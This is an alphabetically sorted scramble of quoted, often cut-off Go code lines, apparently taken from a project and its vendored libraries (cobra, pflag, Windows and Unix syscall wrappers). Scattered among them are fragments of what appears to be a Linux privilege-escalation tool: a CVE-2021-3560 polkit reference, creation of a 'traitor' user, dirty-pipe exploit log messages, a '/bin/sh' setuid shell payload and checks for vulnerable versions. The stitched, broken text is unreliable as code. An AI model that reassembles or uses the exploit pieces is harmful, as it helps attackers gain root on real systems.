"suggestions = append(suggestions, cmd.Name())"
"suggestionsString := """""
"support all other commands as input. Say, for instance, you have a command called"
"svcCall(EZBNMIF4, "
"svcCall(SB),NOSPLIT,$0"
"svcLoad(SB),NOSPLIT,$0"
"svcNameTable[svc_EZBNMIF4][0], EZBNMIF4)"
"svcUnload(SB),NOSPLIT,$0"
"swapctl(int cmd, void "
"switch vPre, cPre := v.Prerelease() != """", c.Prerelease() != """""
"syncFileRange2(fd int, flags int, off int64, n int64) (err error) = SYS_SYNC_FILE_RANGE2"
"sys := sysLinger{Onoff: uint16(l.Onoff), Linger: uint16(l.Linger)}"
"sys)), int32(unsafe.Sizeof(sys)))"
"sys, e = UTF16PtrFromString(system)"
"sys, err = UTF16PtrFromString(system)"
"sys_shmat(int shmid, const void "
"sysarch(int op, void "
"syscall.O_CLOEXEC, 0)"
"syscall.O_NOCTTY, 0) //nolint:gosec // Expected Open from a variable."
"syscall.O_NOCTTY, 0)"
"syscall.ProcessEntry32, error) {"
"syscall.Syscall(procCertFreeCertificateChain.Addr(), 1, uintptr(unsafe.Pointer(ctx)), 0, 0)"
"syscall.Syscall(procCoTaskMemFree.Addr(), 1, uintptr(address), 0, 0)"
"syscall.Syscall(procCoUninitialize.Addr(), 0, 0, 0, 0)"
"syscall.Syscall(procDeleteProcThreadAttributeList.Addr(), 1, uintptr(unsafe.Pointer(attrlist)), 0, 0)"
"syscall.Syscall(procDnsRecordListFree.Addr(), 2, uintptr(unsafe.Pointer(rl)), uintptr(freetype), 0)"
"syscall.Syscall(procExitProcess.Addr(), 1, uintptr(exitcode), 0, 0)"
"syscall.Syscall(procFreeAddrInfoW.Addr(), 1, uintptr(unsafe.Pointer(addrinfo)), 0, 0)"
"syscall.Syscall(procGetSystemTimeAsFileTime.Addr(), 1, uintptr(unsafe.Pointer(time)), 0, 0)"
"syscall.Syscall(procGetSystemTimePreciseAsFileTime.Addr(), 1, uintptr(unsafe.Pointer(time)), 0, 0)"
"syscall.Syscall(procRtlGetNtVersionNumbers.Addr(), 3, uintptr(unsafe.Pointer(majorVersion)), uintptr(unsafe.Pointer(minorVersion)), uintptr(unsafe.Pointer(buildNumber)))"
"syscall.Syscall(procRtlInitString.Addr(), 2, uintptr(unsafe.Pointer(destinationString)), uintptr(unsafe.Pointer(sourceString)), 0)"
"syscall.Syscall(procRtlInitUnicodeString.Addr(), 2, uintptr(unsafe.Pointer(destinationString)), uintptr(unsafe.Pointer(sourceString)), 0)"
"syscall.Syscall(procSetSecurityDescriptorRMControl.Addr(), 2, uintptr(unsafe.Pointer(sd)), uintptr(unsafe.Pointer(rmControl)), 0)"
"syscall.Syscall(procUnsubscribeServiceChangeNotifications.Addr(), 1, uintptr(subscription), 0, 0)"
"syscall.Syscall(procWTSFreeMemory.Addr(), 1, uintptr(ptr), 0, 0)"
"syscall.Syscall6(procGetProcessWorkingSetSizeEx.Addr(), 4, uintptr(hProcess), uintptr(unsafe.Pointer(lpMinimumWorkingSetSize)), uintptr(unsafe.Pointer(lpMaximumWorkingSetSize)), uintptr(unsafe.Pointer(flags)), 0, 0)"
"syscall.Syscall9(procGetAcceptExSockaddrs.Addr(), 8, uintptr(unsafe.Pointer(buf)), uintptr(rxdatalen), uintptr(laddrlen), uintptr(raddrlen), uintptr(unsafe.Pointer(lrsa)), uintptr(unsafe.Pointer(lrsalen)), uintptr(unsafe.Pointer(rrsa)), uintptr(unsafe.Pointer(rrsalen)), 0)"
"syscall6(SB),NOSPLIT,$0-88"
"syscall_goos=""syscall_$GOOS.go"""
"syscall_goos=""syscall_bsd.go $syscall_goos"""
"syscall_rawsyscall(SB),NOSPLIT,$0-56"
"syscall_rawsyscall6(SB),NOSPLIT,$0-80"
"syscall_rawsyscall9(SB),NOSPLIT,$0"
"syscall_syscall(SB),NOSPLIT,$0-56"
"syscall_syscall(SYS_EXIT, uintptr(code), 0, 0)"
"syscall_syscall(SYS_SYNC, 0, 0, 0)"
"syscall_syscall(libc_exit_trampoline_addr, uintptr(code), 0, 0)"
"syscall_syscall6(SB),NOSPLIT,$0-80"
"syscall_syscall9(SB),NOSPLIT,$0"
"sysctl(mib []_C_int, old "
"system can be generated at once, and generated files will not change based on"
"systemdir, err := GetSystemDirectory()"
"sysvicall6(SB),NOSPLIT,$0-88"
"t := os.NewFile(uintptr(ptsfd), sname)"
"t := template.New(""top"")"
"t"" $2 ""[ "
"t"")[0]"
"t"")[0])"
"t%s"", flagName, flag.Usage))"
"t%s"", subCmd.Name(), subCmd.Short))"
"t')"""
"t, err := os.OpenFile(""/dev/"""
"t, err := os.OpenFile(sname, os.O_RDWR"
"t, err := os.OpenFile(sname, os.O_RDWR, 0)"
"t, err := strconv.ParseUint(val, 10, 0)"
"t, s = wrapN(wrap, slop, s)"
"t.cursorX, t.cursorY = 0, 0"
"t.move(0, 1, 0, 0)"
"t.move(t.cursorY, 0, 0, 0)"
"t.move(t.cursorY, 0, t.cursorX, 0)"
"t.move(up, down, left, right)"
"t.outBuf = append(t.outBuf, '"
"t.outBuf = append(t.outBuf, []byte(string(data))...)"
"t.queue([]rune("""
"t.setLine([]rune(newLine), utf8.RuneCount([]byte(newLine)[:newPos]))"
"t.setLine(runes, len(runes))"
"t.setLine(t.line, t.pos)"
"t.termWidth, t.termHeight = width, height"
"t64, err := strconv.ParseFloat(val, 32)"
"t64, err := strconv.ParseInt(val, 0, 32)"
"t=%s"", imageName),"
"tAn image registry"", ""thanos"
"tCompletions for bash"", ""zsh"
"tCompletions for zsh""}"
"tLong-term metrics""}, cobra.ShellCompDirectiveNoFileComp"
"tagName = """""
"tagName = fmt.Sprintf(""%s%c"", tagName, r)"
"target, err := os.Open(path)"
"targetDir, err := findWritableDirectory()"
"targets, size_t ntargets, const void "
"tcpinfo, nil"
"tcpinfo.Pmtu = conn.sendMSS // dummy, NWMIfRouteMtu is a candidate"
"temp, err := NewVersion(string(b))"
"temp64, err = strconv.ParseFloat(d, 32)"
"temp64, err = strconv.ParseInt(d, 0, 32)"
"tempFile, err := ioutil.TempFile(os.TempDir(), ""t"")"
"template := fmt.Sprintf(""%%-%ds"", padding)"
"termHeight:   24,"
"termWidth, termHeight int"
"termWidth:    80,"
"termios, err := unix.IoctlGetTermios(fd, ioctlReadTermios)"
"termios}}, nil"
"testPath := filepath.Join(targetDir, name)"
"tframe,"
"that on any platform that supports Docker, all the files using the new build"
"the completion algorithm if entered manually, e.g. in:"
"the future, licensable by Google that are necessarily infringed by this"
"the kernel or system library updates, modify the Dockerfile at"
"the rights to use, copy, modify, merge, publish, distribute,"
"there is one more field ""Shorthand"" that you will need to set."
"this looks like, both from an organizational and a technical perspective, see"
"this repository, see https://golang.org/doc/contribute.html."
"through godef to get the Go compatible definitions. Finally, the generated code"
"time.Duration, name string, value time.Duration, usage string) {"
"time.Duration, name, shorthand string, value time.Duration, usage string) {"
"timeout, uint32_t "
"timer_create(clockid_t clock_id, struct sigevent "
"timer_gettime(timer_t timerid, struct itimerspec "
"timer_settime(timer_t timerid, int flags, const struct itimerspec "
"times, int flag)"
"tmpFileContent: tmpFileContent,"
"to := ""."""
"to system, based on differences in the header files."
"to use, copy, modify, merge, publish, distribute, sublicense, and/or sell"
"to, err := UTF16PtrFromString(newpath)"
"to, socklen_t tolen)"
"tp, struct timezone "
"tp, void "
"tptr, int flag)"
"tramp, int vers)"
"transfer and otherwise run, modify and propagate the contents of this"
"ts := setTimespec(sec, nsec)"
"ts,    const sigset_t "
"ts, const sigset_t "
"ts, int flags)"
"ts, lwpid_t unpark, const void "
"ts[0])), 0)"
"ts[0])), flags)"
"tty = os.NewFile(uintptr(ptm.Sfd), ""/dev/ptm"")"
"tv)), "
"tv), "
"tv, const struct timezone "
"tv, const void "
"tv, err"
"tv, nil"
"tv, struct timezone "
"typ, err := ByteSliceFromString(sa.Type)"
"type constraintFunc func(v, c "
"type, char "
"type, const char "
"t{ %d, "
"u)), "
"u, ""json"", false, ""Output in JSON"")"
"u, ""username"", ""u"", """", ""Username (required if password is set)"")"
"u, e := UTF16PtrFromString(username)"
"u, err := Parse(src)"
"u, err := strconv.ParseUint(d, 10, 0)"
"u, nil"
"u, s16)"
"u.Uid,"
"u_fhp, int flags)"
"u_fhp, struct stat "
"u_fhp, struct statfs "
"u_fhp, struct statvfs "
"uaddr1, void "
"ucp, u_long flags, lwpid_t "
"ucred, nil"
"ueadd, _, _ := syscall_syscall(SYS___ERR2AD, 0, 0, 0)"
"uer2, _, _ := syscall_syscall(SYS___ERRNO2, 0, 0, 0)"
"uint, name string, value uint, usage string) {"
"uint, name, shorthand string, value uint, usage string) {"
"uint16(0),"
"uint16) (attrs uint32, err error) [failretval==INVALID_FILE_ATTRIBUTES] = kernel32.GetFileAttributesW"
"uint16) (attrs uint32, err error) {"
"uint16) (handle Handle, err Errno)"
"uint16) (handle Handle, err error) = kernel32.CreateJobObjectW"
"uint16) (handle Handle, err error) = kernel32.OpenEventW"
"uint16) (handle Handle, err error) = kernel32.OpenMutexW"
"uint16) (handle Handle, err error) [failretval == 0 "
"uint16) (handle Handle, err error) [failretval==0] = advapi32.CreateServiceW"
"uint16) (handle Handle, err error) [failretval==0] = advapi32.RegisterEventSourceW"
"uint16) (handle Handle, err error) {"
"uint16) (n uint32, err error) = GetCurrentDirectoryW"
"uint16) (n uint32, err error) = GetTempPathW"
"uint16) (n uint32, err error) = kernel32.GetFullPathNameW"
"uint16) (n uint32, err error) [failretval==0] = GetLogicalDriveStringsW"
"uint16) (n uint32, err error) {"
"uint16) (store Handle, err error) = crypt32.CertOpenSystemStoreW"
"uint16) (store Handle, err error) {"
"uint16) (uintptr, error) {"
"uint16, accNameFormat uint32, desiredNameFormat uint32, translatedName "
"uint16, access uint32) (handle Handle, err error) [failretval==0] = advapi32.OpenSCManagerW"
"uint16, access uint32) (handle Handle, err error) [failretval==0] = advapi32.OpenServiceW"
"uint16, access uint32) (handle Handle, err error) {"
"uint16, access uint32, mode uint32, sa "
"uint16, access uint32, srvType uint32, startType uint32, errCtl uint32, pathName "
"uint16, accountName "
"uint16, argc "
"uint16, args "
"uint16, attrs uint32) (err error) = kernel32.SetFileAttributesW"
"uint16, attrs uint32) (err error) {"
"uint16, bindOpts "
"uint16, boxtype uint32) (ret int32, err error) [failretval==0] = user32.MessageBoxW"
"uint16, boxtype uint32) (ret int32, err error) {"
"uint16, buf "
"uint16, bufSize "
"uint16, bufType "
"uint16, buffer "
"uint16, bufferLen uint32, flags uint32) (ret CONFIGRET) = CfgMgr32.CM_Get_Device_Interface_ListW"
"uint16, bufferLen uint32, flags uint32) (ret CONFIGRET) {"
"uint16, bufferLength uint32) (err error) = FindNextVolumeMountPointW"
"uint16, bufferLength uint32) (err error) = FindNextVolumeW"
"uint16, bufferLength uint32) (err error) = GetVolumePathNameW"
"uint16, bufferLength uint32) (err error) {"
"uint16, bufferLength uint32) (handle Handle, err error) [failretval==InvalidHandle] = FindFirstVolumeMountPointW"
"uint16, bufferLength uint32) (handle Handle, err error) [failretval==InvalidHandle] = FindFirstVolumeW"
"uint16, bufferLength uint32) (handle Handle, err error) {"
"uint16, bufferLength uint32, returnLength "
"uint16, bufferlength uint32) (err error) = GetVolumeNameForVolumeMountPointW"
"uint16, bufferlength uint32) (err error) {"
"uint16, buflen uint32) (n uint32, err error) = kernel32.GetLongPathNameW"
"uint16, buflen uint32) (n uint32, err error) = kernel32.GetShortPathNameW"
"uint16, buflen uint32) (n uint32, err error) {"
"uint16, buflen uint32, buf "
"uint16, caption "
"uint16, cchMax int32) (chars int32) = ole32.StringFromGUID2"
"uint16, cchMax int32) (chars int32) {"
"uint16, classGUID "
"uint16, classGuidList "
"uint16, classLen "
"uint16, classNameSize uint32, requiredSize "
"uint16, commandLine "
"uint16, currentDir "
"uint16, cwd "
"uint16, data "
"uint16, databaseName "
"uint16, dirLen "
"uint16, dirLen uint32) (len uint32, err error) = kernel32.GetSystemDirectoryW"
"uint16, dirLen uint32) (len uint32, err error) = kernel32.GetSystemWindowsDirectoryW"
"uint16, dirLen uint32) (len uint32, err error) = kernel32.GetWindowsDirectoryW"
"uint16, dirLen uint32) (len uint32, err error) {"
"uint16, displayName "
"uint16, dst "
"uint16, err error) [failretval==nil] = kernel32.GetEnvironmentStringsW"
"uint16, err error) {"
"uint16, error) {"
"uint16, existingfilename "
"uint16, file "
"uint16, filePathSize uint32, flags uint32) (n uint32, err error) = kernel32.GetFinalPathNameByHandleW"
"uint16, filePathSize uint32, flags uint32) (n uint32, err error) {"
"uint16, fileSystemNameSize uint32) (err error) = GetVolumeInformationByHandleW"
"uint16, fileSystemNameSize uint32) (err error) = GetVolumeInformationW"
"uint16, fileSystemNameSize uint32) (err error) {"
"uint16, flags SUOI, reserved uintptr) (err error) = setupapi.SetupUninstallOEMInfW"
"uint16, flags SUOI, reserved uintptr) (err error) {"
"uint16, flags uint32) (err error) = MoveFileExW"
"uint16, flags uint32) (err error) [failretval"
"uint16, flags uint32) (err error) {"
"uint16, flags uint32) (ret CONFIGRET) = CfgMgr32.CM_Get_Device_Interface_List_SizeW"
"uint16, flags uint32) (ret CONFIGRET) {"
"uint16, flags uint32) (store Handle, err error) = crypt32.PFXImportCertStore"
"uint16, flags uint32) (store Handle, err error) {"
"uint16, flags uint32, desiredAccess uint32) (handle Handle, err error) [failretval == 0 "
"uint16, flags uint32, desiredAccess uint32) (handle Handle, err error) {"
"uint16, flags uint32, pipeMode uint32, maxInstances uint32, outSize uint32, inSize uint32, defaultTimeout uint32, sa "
"uint16, fname "
"uint16, freeBytesAvailableToCaller "
"uint16, handle uint32, bufSize uint32, buffer unsafe.Pointer) (err error) {"
"uint16, handlerProc uintptr, context uintptr) (handle Handle, err error) = advapi32.RegisterServiceCtrlHandlerExW"
"uint16, handlerProc uintptr, context uintptr) (handle Handle, err error) {"
"uint16, hints "
"uint16, hwndParent uintptr, CreationFlags DICD, deviceInfoData "
"uint16, hwndParent uintptr, Flags DIGCF, deviceInfoSet DevInfo, machineName "
"uint16, instanceIdSize uint32, instanceIdRequiredSize "
"uint16, level uint32, buf "
"uint16, level uint32, info "
"uint16, loadOrderGroup "
"uint16, luid "
"uint16, max uint32) (n uint32, err error) [failretval==0] = QueryDosDeviceW"
"uint16, max uint32) (n uint32, err error) {"
"uint16, maxUserNameSize uint32) (err error) = GetNamedPipeHandleStateW"
"uint16, maxUserNameSize uint32) (err error) {"
"uint16, message "
"uint16, module "
"uint16, n "
"uint16, nSize "
"uint16, name "
"uint16, name string, value uint16, usage string) {"
"uint16, name, shorthand string, value uint16, usage string) {"
"uint16, name2 "
"uint16, nameLen "
"uint16, nativeMachine "
"uint16, ntName "
"uint16, nwchar int32) (nwrite int32, err error) = kernel32.MultiByteToWideChar"
"uint16, nwchar int32) (nwrite int32, err error) {"
"uint16, objectType SE_OBJECT_TYPE, securityInformation SECURITY_INFORMATION, owner "
"uint16, optionalEntropy "
"uint16, options uint32, desiredAccess uint32, result "
"uint16, password "
"uint16, pclsid "
"uint16, pointerToBufferPointer unsafe.Pointer, bufSize "
"uint16, procSecurity "
"uint16, provider "
"uint16, provtype uint32, flags uint32) (err error) = advapi32.CryptAcquireContextW"
"uint16, provtype uint32, flags uint32) (err error) {"
"uint16, qtype uint16, options uint32, extra "
"uint16, rawData "
"uint16, refdDomainNameLen "
"uint16, relativeName "
"uint16, reserved "
"uint16, reserved uintptr) (err error) = setupapi.SetupDiClassGuidsFromNameExW"
"uint16, reserved uintptr) (err error) = setupapi.SetupDiClassNameFromGuidExW"
"uint16, reserved uintptr) (err error) [failretval"
"uint16, reserved uintptr) (err error) {"
"uint16, reserved uintptr) (handle DevInfo, err error) [failretval==DevInfo(InvalidHandle)] = setupapi.SetupDiCreateDeviceInfoListExW"
"uint16, reserved uintptr) (handle DevInfo, err error) [failretval==DevInfo(InvalidHandle)] = setupapi.SetupDiGetClassDevsExW"
"uint16, reserved uintptr) (handle DevInfo, err error) {"
"uint16, revision uint32, sd "
"uint16, sa "
"uint16, serviceStartName "
"uint16, servicename "
"uint16, shortpath "
"uint16, showCmd int32) (err error) [failretval<=32] = shell32.ShellExecuteW"
"uint16, showCmd int32) (err error) {"
"uint16, sid "
"uint16, size "
"uint16, size uint32) (chars uint32) = crypt32.CertGetNameStringW"
"uint16, size uint32) (chars uint32) {"
"uint16, size uint32) (err error) = psapi.GetModuleBaseNameW"
"uint16, size uint32) (err error) = psapi.GetModuleFileNameExW"
"uint16, size uint32) (err error) {"
"uint16, size uint32) (n uint32, err error) = kernel32.ExpandEnvironmentStringsW"
"uint16, size uint32) (n uint32, err error) = kernel32.GetEnvironmentVariableW"
"uint16, size uint32) (n uint32, err error) = kernel32.GetModuleFileNameW"
"uint16, size uint32) (n uint32, err error) {"
"uint16, sourceName "
"uint16, startupInfo "
"uint16, strLen "
"uint16, tagId "
"uint16, targetPath "
"uint16, targetfilename "
"uint16, timeout uint32, forceAppsClosed bool, rebootAfterShutdown bool, reason uint32) (err error) = advapi32.InitiateSystemShutdownExW"
"uint16, timeout uint32, forceAppsClosed bool, rebootAfterShutdown bool, reason uint32) (err error) {"
"uint16, to "
"uint16, token Token, inheritExisting bool) (err error) = userenv.CreateEnvironmentBlock"
"uint16, token Token, inheritExisting bool) (err error) {"
"uint16, toread uint32, read "
"uint16, towrite uint32, written "
"uint16, userName "
"uint16, value "
"uint16, volumeMountPoint "
"uint16, volumeName "
"uint16, volumeNameBuffer "
"uint16, volumeNameSize uint32, volumeNameSerialNumber "
"uint16, volumePathName "
"uint16, volumePathNames "
"uint16, watchSubtree bool, notifyFilter uint32) (handle Handle, err error) {"
"uint16, zero Handle, flags uintptr) (handle Handle, err error) {"
"uint16, zeroHandle "
"uint16Value, "
"uint32(0),"
"uint32(unsafe.Sizeof(WSAID_CONNECTEX)),"
"uint32(unsafe.Sizeof(WSAID_WSARECVMSG)),"
"uint32(unsafe.Sizeof(WSAID_WSASENDMSG)),"
"uint32(unsafe.Sizeof(connectExFunc.addr)),"
"uint32(unsafe.Sizeof(sendRecvMsgFunc.recvAddr)),"
"uint32(unsafe.Sizeof(sendRecvMsgFunc.sendAddr)),"
"uint32) (n int32, err error) [failretval==-1] = ws2_32.WSAEnumProtocolsW"
"uint32) (n int32, err error) {"
"uint32) (tid uint32, err error) = user32.GetWindowThreadProcessId"
"uint32) (tid uint32, err error) {"
"uint32) error) ([]string, error) {"
"uint32,  from "
"uint32, buf "
"uint32, buildNumber "
"uint32, callerFreeProvOrNCryptKey "
"uint32, certStore "
"uint32, class "
"uint32, collectDataTimeout "
"uint32, contentType "
"uint32, curInstances "
"uint32, dacl "
"uint32, dependencies "
"uint32, devInst DEVINST, flags uint32) (ret CONFIGRET) = CfgMgr32.CM_Get_DevNode_Status"
"uint32, devInst DEVINST, flags uint32) (ret CONFIGRET) {"
"uint32, devInst DEVINST, flags uint32) error {"
"uint32, fileSystemFlags "
"uint32, fileSystemNameBuffer "
"uint32, filterFlag uint32) (err error) = psapi.EnumProcessModulesEx"
"uint32, filterFlag uint32) (err error) {"
"uint32, flags "
"uint32, flags uint32) (err error) = setupapi.SetupDiGetDevicePropertyW"
"uint32, flags uint32) (err error) {"
"uint32, flags uint32, overlapped "
"uint32, flags uint32, to "
"uint32, flags uint32, to Sockaddr, overlapped "
"uint32, formatType "
"uint32, from "
"uint32, group "
"uint32, groupName "
"uint32, inSize "
"uint32, inputControl "
"uint32, interfaceClass "
"uint32, key "
"uint32, lastWriteTime "
"uint32, machineName "
"uint32, maxClassLen "
"uint32, maxCollectionCount "
"uint32, maxInstances "
"uint32, maxSubkeyLen "
"uint32, maxValueLen "
"uint32, maxValueNameLen "
"uint32, maximumComponentLength "
"uint32, minorVersion "
"uint32, name string, value uint32, usage string) {"
"uint32, name, shorthand string, value uint32, usage string) {"
"uint32, newSecurityDescriptor "
"uint32, outSize "
"uint32, overlapped "
"uint32, owner "
"uint32, problemNumber "
"uint32, propertyBuffer "
"uint32, refdDomainName "
"uint32, reserved "
"uint32, resumeHandle "
"uint32, saLen "
"uint32, sacl "
"uint32, servicesReturned "
"uint32, subkeysLen "
"uint32, timeout "
"uint32, use "
"uint32, userName "
"uint32, valtype "
"uint32, valuesLen "
"uint32, wait bool) (err error) {"
"uint32, wait bool) (err error)"
"uint32, wait bool, flags "
"uint32Value, "
"uint64(0),"
"uint64) (n int, err error) {"
"uint64) (n int, err error)"
"uint64, name string, value uint64, usage string) {"
"uint64, name, shorthand string, value uint64, usage string) {"
"uint64, totalNumberOfBytes "
"uint64, totalNumberOfFreeBytes "
"uint64Value, "
"uint8(0),"
"uint8) (proc uintptr, err Errno)"
"uint8, name string, value uint8, usage string) {"
"uint8, name, shorthand string, value uint8, usage string) {"
"uint8Value, "
"uintSliceValue) fromString(val string) (uint, error) {"
"uintValue, "
"uintptr(n), uintptr(unsafe.Pointer("
"uintptr(n), word)"
"uintptr) (n int, err error) {"
"uintptr) (n int, err error)"
"uintptr, flags "
"uintptr, lpMaximumWorkingSetSize "
"uintptr, new "
"uintptr, overlapped "
"uintptr_t gccgoRealSyscallNoError(uintptr_t trap, uintptr_t a1, uintptr_t a2, uintptr_t a3, uintptr_t a4, uintptr_t a5, uintptr_t a6, uintptr_t a7, uintptr_t a8, uintptr_t a9)"
"uintptr_t mmap(uintptr_t, uintptr_t, int, int, int, long long)"
"uintptr_t mmap64(uintptr_t, uintptr_t, int, int, int, long long)"
"uname.Machine[0], "
"uname.Nodename[0], "
"uname.Release[0], "
"uname.Sysname[0], "
"uname.Version[0], "
"underline: """
"unix.Bind(fd, addr)"
"unix.SockaddrALG{Type: ""hash"", Name: ""sha1""}"
"unix.SockaddrRFCOMM).Addr, nfd)"
"unlinkat(int fd, const char "
"unsafe.Pointer, dsa "
"unset = append(unset, flagname)"
"usage := ""help for """
"usage := ""version for """
"use(SB),NOSPLIT,$0"
"used, alreadyThere := f.shorthands[c]"
"user, err := user.Lookup(username)"
"user, err := v.createUser(log)"
"user.User, error) {"
"user.User, log logger.Logger) string {"
"userLicense, ""license"", ""l"", """", ""name of license for the project"")"
"userinfo := ""CVE-2021-3560"""
"userinfo,"
"username := fmt.Sprintf(""traitor%d"", rand.Intn(10000))"
"username,"
"utimensat(dirfd int, path string, times "
"utimensat(fd int, path string, times "
"utimensat(int fd, const char "
"utimes(path string, times "
"utimes(path string, timeval "
"uuid)[:], src)"
"uuid, err := NewUUID()"
"uuid, err := Parse(s)"
"uuid: uuid.NewString(),"
"uuid[i/2], ok = xtob(b[i], b[i"
"uuid[i], ok = xtob(s[i"
"v)), "
"v)), int32(unsafe.Sizeof(v)))"
"v, err := readAsCSV(val)"
"v, err := strconv.ParseBool(s)"
"v, err := strconv.ParseFloat(s, 32)"
"v, err := strconv.ParseFloat(s, 64)"
"v, err := strconv.ParseFloat(sval, 32)"
"v, err := strconv.ParseInt(s, 0, 0)"
"v, err := strconv.ParseInt(s, 0, 16)"
"v, err := strconv.ParseInt(s, 0, 32)"
"v, err := strconv.ParseInt(s, 0, 64)"
"v, err := strconv.ParseInt(s, 0, 8)"
"v, err := strconv.ParseInt(sval, 0, 16)"
"v, err := strconv.ParseInt(sval, 0, 32)"
"v, err := strconv.ParseInt(sval, 0, 8)"
"v, err := strconv.ParseUint(s, 0, 16)"
"v, err := strconv.ParseUint(s, 0, 32)"
"v, err := strconv.ParseUint(s, 0, 64)"
"v, err := strconv.ParseUint(s, 0, 8)"
"v, err := strconv.ParseUint(sval, 0, 0)"
"v, err := strconv.ParseUint(sval, 0, 16)"
"v, err := strconv.ParseUint(sval, 0, 32)"
"v, err := strconv.ParseUint(sval, 0, 64)"
"v, err := strconv.ParseUint(sval, 0, 8)"
"v, err := time.ParseDuration(s)"
"v, ok := xtob(b[x], b[x"
"v, ok := xtob(s[x], s[x"
"v.binaryName,"
"v.log.Printf(""Creating pipe..."")"
"v.log.Printf(""Determining pipe size..."")"
"v.log.Printf(""Draining pipe..."")"
"v.log.Printf(""Filling pipe..."")"
"v.log.Printf(""Opening '%s' for read..."", path)"
"v.log.Printf(""Pipe drained."")"
"v.log.Printf(""Pipe size is %d."", size)"
"v.log.Printf(""Splicing data..."")"
"v.log.Printf(""Write of '%s' successful!"", path)"
"v.log.Printf(""Writing to dirty pipe..."")"
"v1, err := version.NewVersion(""1.2"")"
"v2, err := version.NewVersion(""1.5"
"v[i], v[j] = v[j], v[i]"
"val = strings.Trim(val, ""[]"")"
"val, err := f.getFlagType(name, ""bool"", boolConv)"
"val, err := f.getFlagType(name, ""boolSlice"", boolSliceConv)"
"val, err := f.getFlagType(name, ""bytesBase64"", bytesBase64ValueConv)"
"val, err := f.getFlagType(name, ""bytesHex"", bytesHexConv)"
"val, err := f.getFlagType(name, ""count"", countConv)"
"val, err := f.getFlagType(name, ""duration"", durationConv)"
"val, err := f.getFlagType(name, ""durationSlice"", durationSliceConv)"
"val, err := f.getFlagType(name, ""float32"", float32Conv)"
"val, err := f.getFlagType(name, ""float32Slice"", float32SliceConv)"
"val, err := f.getFlagType(name, ""float64"", float64Conv)"
"val, err := f.getFlagType(name, ""float64Slice"", float64SliceConv)"
"val, err := f.getFlagType(name, ""int"", intConv)"
"val, err := f.getFlagType(name, ""int16"", int16Conv)"
"val, err := f.getFlagType(name, ""int32"", int32Conv)"
"val, err := f.getFlagType(name, ""int32Slice"", int32SliceConv)"
"val, err := f.getFlagType(name, ""int64"", int64Conv)"
"val, err := f.getFlagType(name, ""int64Slice"", int64SliceConv)"
"val, err := f.getFlagType(name, ""int8"", int8Conv)"
"val, err := f.getFlagType(name, ""intSlice"", intSliceConv)"
"val, err := f.getFlagType(name, ""ip"", ipConv)"
"val, err := f.getFlagType(name, ""ipMask"", parseIPv4Mask)"
"val, err := f.getFlagType(name, ""ipNet"", ipNetConv)"
"val, err := f.getFlagType(name, ""ipSlice"", ipSliceConv)"
"val, err := f.getFlagType(name, ""string"", stringConv)"
"val, err := f.getFlagType(name, ""stringArray"", stringArrayConv)"
"val, err := f.getFlagType(name, ""stringSlice"", stringSliceConv)"
"val, err := f.getFlagType(name, ""stringToInt"", stringToIntConv)"
"val, err := f.getFlagType(name, ""stringToInt64"", stringToInt64Conv)"
"val, err := f.getFlagType(name, ""stringToString"", stringToStringConv)"
"val, err := f.getFlagType(name, ""uint"", uintConv)"
"val, err := f.getFlagType(name, ""uint16"", uint16Conv)"
"val, err := f.getFlagType(name, ""uint32"", uint32Conv)"
"val, err := f.getFlagType(name, ""uint64"", uint64Conv)"
"val, err := f.getFlagType(name, ""uint8"", uint8Conv)"
"val, err := f.getFlagType(name, ""uintSlice"", uintSliceConv)"
"val, err := strconv.ParseInt(str, 10, 64)"
"val, socklen_t "
"val, socklen_t valsize)"
"validArgs = []string{ ""pod"", ""node"", ""service"", ""replicationcontroller"" }"
"validArgs = append(validArgs, strings.Split(v, """
"valptr, _, errno := Syscall(fcntl64Syscall, uintptr(fd), uintptr(cmd), uintptr(arg))"
"valptr, _, errno := sysvicall6(uintptr(unsafe.Pointer("
"value = strings.Split(value, """
"value), "
"value), 1)"
"value), 8)"
"value, ENOSYS"
"value, e.g.:"
"value, err"
"value, errno"
"value, int len)"
"value, size_t size)"
"value, size_t size, int flags)"
"value, struct itimerspec "
"value,"
"value=""${BASH_REMATCH[3]}"""
"value=""ERROR_SUCCESS"""
"value=""S_OK"""
"value[0])), 4)"
"value[0]), "
"value[0]), 4)"
"var CommandLine = NewFlagSet(os.Args[0], ExitOnError)"
"var Default Payload = ""/bin/sh"""
"var ErrHelp = errors.New(""pflag: help requested"")"
"var ErrUnsupported = errors.New(""unsupported"")"
"var Version string = ""v0.0.0"""
"var absoluteSDSize, daclSize, saclSize, ownerSize, groupSize uint32"
"var bufferAlet, reasonCode uint32 = 0, 0"
"var bufferLen, returnValue, returnCode int32 = 4096, 0, 0"
"var change, event unsafe.Pointer"
"var clp, datap "
"var eraseUnderCursor = []rune{' ', keyEscape, '[', 'D'}"
"var filenameRunes = []rune(""abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890_-"")"
"var imageRunes = []rune(""abcdefghijklmnopqrstuvwxyz"")"
"var ip = flag.Int(""flagname"", 1234, ""help message for flagname"")"
"var ip = flag.IntP(""flagname"", ""f"", 1234, ""help message"")"
"var jsonNull = []byte(""null"")"
"var left, right int64"
"var name16, resType16 "
"var namePtr, resTypePtr uintptr"
"var pathUnsafe, flagsUnsafe unsafe.Pointer"
"var r, l string"
"var r, w Handle"
"var resetAll = """
"var resetBg = """
"var resetFg = """
"var setuidShell = ""/bin/sh"""
"var setuidShellCmd = """""
"var socketProtocol = func(fd int) (int, error) {"
"varname, usage := UnquoteUsage(flag)"
"vbuf, long vbufsize, int flags)"
"version.Version, len(versionsRaw))"
"versionBits := strings.Split(last, ""."")"
"versionRegexp = regexp.MustCompile("""
"versionVal, err := c.Flags().GetBool(""version"")"
"versions, can increment versions, etc."
"versionsRaw := []string{""1.1"", ""0.7.1"", ""1.4-beta"", ""1.4"", ""2""}"
"viper.BindPFlag(""author"", rootCmd.PersistentFlags().Lookup(""author""))"
"viper.BindPFlag(""useViper"", rootCmd.PersistentFlags().Lookup(""viper""))"
"viper.SetConfigName("".cobra"")"
"viper.SetConfigType(""yaml"")"
"viper.SetDefault(""author"", ""NAME HERE <EMAIL ADDRESS>"")"
"viper.SetDefault(""license"", ""apache"")"
"vs := strings.Split(v, "","")"
"vt100EscapeCodes,"
"vtype="""""
"vtype=""${BASH_REMATCH[2]}"""
"vtype=""Handle"""
"vtype=""syscall.Errno"""
"vulnerable, err := version.NewVersion(""0.105-26"") // vuln was introduced in 0.105-26"
"vulnerable, err := version.NewVersion(""0.113"") // vuln was introduced in 0.113"
"w := strings.LastIndexAny(s[:i], "" "
